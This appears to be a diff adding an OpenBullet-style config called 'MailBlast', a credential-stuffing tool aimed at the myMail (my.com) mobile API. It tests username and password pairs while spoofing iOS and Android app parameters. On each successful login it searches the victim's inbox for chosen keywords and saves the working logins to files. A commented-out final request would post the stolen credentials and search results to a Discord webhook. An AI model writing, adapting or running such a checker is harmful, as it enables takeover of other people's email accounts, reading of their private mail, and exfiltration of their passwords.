@@ -1,0 +1,134 @@
+[SETTINGS]
+{
+  "Name": "MailBlast",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-25T14:38:14.9396391-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Contact#1001",
+  "Version": "1.5.7",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "",
+      "VariableName": "SEARCH_KEY",
+      "Id": 1863634368
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUEST_URL REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "Pragma: no-cache" 
+
+#GET_COOKIE PARSE "<COOKIES(Mpop)>" LR "" "" -> VAR "POP" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Ok=1" 
+  KEYCHAIN Failure OR 
+    KEY "Ok=0" 
+
+#REQUEST_TOKEN REQUEST GET "https://aj-https.my.com/api/v1/tokens?email=<USER>&mp=android&mmp=mail&DeviceID=b915df62e3c1dee109e71b47c28f156b&client=mobile&udid=1b1f390dc8898c3caff164a55f5bc91619ab15d5fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI 8 Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=Xiaomi MI 8 Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&appsflyerid=1596761345723-8129751771213333860&current=google&first=google&md5_signature=feff7cbcf5bd717fbf3dedc617a0adbf" 
+  
+  HEADER "User-Agent: mobmail android 12.8.0.30440 com.my.mail" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie: Mpop=<POP>;domain=my.com" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#SAVE_TOKEN PARSE "<SOURCE>" JSON "body.token" JTokenParsing=TRUE -> VAR "TOKEN" 
+
+IF "<SEARCH_KEY>" Contains ","
+
+#SPLIT UTILITY Variable "SEARCH_KEY" Split "," -> VAR "KEYS" 
+
+#KEY_LENGTH UTILITY List "KEYS" Length -> VAR "LEN" 
+
+#CREATE_LIST_RESULT UTILITY List "" Create -> CAP "RESULTS" 
+
+SET VAR "INDEX" "0"
+WHILE "<INDEX>" LessThan "<LEN>"
+
+#SEARCH_BLOCK REQUEST GET "https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=<KEYS[<INDEX>]>&snippet_limit=277&with_threads=true&email=<USER>&mp=android&mmp=mail&DeviceID=b915df62e3c1dee109e71b47c28f156b&client=mobile&udid=1b1f390dc8898c3caff164a55f5bc91619ab15d5fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI 8 Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=Xiaomi MI 8 Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=<TOKEN>&md5_signature=efb24052d8bed655df0e291e3c5af6dc" 
+  
+  HEADER "User-Agent: mobmail android 12.8.0.30440 com.my.mail" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie: Mpop=<POP>;domain=my.com" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "body.found.count" JTokenParsing=TRUE -> VAR "FOUND" "" " Results for <KEYS[<INDEX>]>" 
+
+PARSE "<SOURCE>" JSON "body.found.count" JTokenParsing=TRUE -> VAR "FOUND_N" 
+
+IF "<FOUND_N>" LessThan "1"
+JUMP #INCRE
+ELSE
+
+PARSE "<SOURCE>" LR "subject\":\"" "\"" -> VAR "CONTENT" 
+
+UTILITY List "RESULTS" Add "<FOUND> | <CONTENT>" "<INDEX>" -> VAR "ADD" 
+
+#SAVE_ON_FILE UTILITY File "<KEYS[<INDEX>]>.txt" AppendLines "<USER>:<PASS>: <FOUND_N> RESULTS" -> VAR "SAVE" 
+
+#INCRE FUNCTION Compute "<INDEX>+1" -> VAR "INDEX" 
+
+ENDWHILE
+ELSE
+
+#SEARCH_BLOCK REQUEST GET "https://aj-https.my.com/api/v1/messages/search?htmlencoded=false&limit=1&offset=0&query=<SEARCH_KEY>&snippet_limit=277&with_threads=true&email=<USER>&mp=android&mmp=mail&DeviceID=b915df62e3c1dee109e71b47c28f156b&client=mobile&udid=1b1f390dc8898c3caff164a55f5bc91619ab15d5fa8d9287dc335bfd9e09abd6&instanceid=cRYT1qjfiKE&playservices=202614037&connectid=9d4527fca2ee1717352c7dfd339a86a8&os=Android&os_version=10&ver=com.my.mail12.8.0.30440&appbuild=30440&vendor=Xiaomi&model=MI 8 Lite&device_type=Smartphone&country=BR&language=pt_BR&timezone=GMT-03:00&device_name=Xiaomi MI 8 Lite&idfa=142b1b43-88ee-4a6e-9b84-0472623d63b5&device_year=2014&connection_class=UNKNOWN&current=google&first=google&behaviorName=default+stickers&appsflyerid=1596761345723-8129751771213333860&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=<TOKEN>&md5_signature=efb24052d8bed655df0e291e3c5af6dc" 
+  
+  HEADER "User-Agent: mobmail android 12.8.0.30440 com.my.mail" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie: Mpop=<POP>;domain=my.com" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "body.found.count" JTokenParsing=TRUE -> VAR "FOUND" "" " Results for <SEARCH_KEY>" 
+
+PARSE "<SOURCE>" JSON "body.found.count" JTokenParsing=TRUE -> VAR "FOUND_N" 
+
+#SAVE_ON_FILE UTILITY File "<SEARCH_KEY>.txt" AppendLines "<USER>:<PASS>: <FOUND_N> RESULTS" -> VAR "SAVE" 
+
+ENDIF
+
+!REQUEST POST "https://discord.com/api/webhooks/769427303083933698/NcTbfITHIklh9OXTD8nAxNUkhCUb4nKrUhTVNUj8aUGUsg6IXF5xsqbdrhBUvylBbQUY" 
+!  CONTENT "{\"content\":\">>> ```<USER>:<PASS> | <RESULTS>```\"}" 
+!  CONTENTTYPE "application/json" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
